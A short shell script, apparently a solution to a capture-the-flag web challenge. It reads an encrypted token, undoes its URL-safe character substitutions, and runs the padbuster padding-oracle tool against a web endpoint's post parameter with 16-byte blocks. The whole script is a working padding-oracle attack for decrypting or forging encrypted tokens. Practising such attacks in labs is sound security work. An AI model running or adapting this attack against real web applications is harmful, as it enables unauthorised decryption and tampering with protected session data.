#!/bin/sh
token=$(cat /scripts/token.txt)
decodedToken=$(sed 's/~/=/g ; s/\!/\//g ; s/\-/\+/g' /scripts/token.txt)
URL="http://35.227.24.107/2c03561963/?post="
echo $decodedToken
padbuster $URL+$decodedToken $decodedToken 16 -encoding 0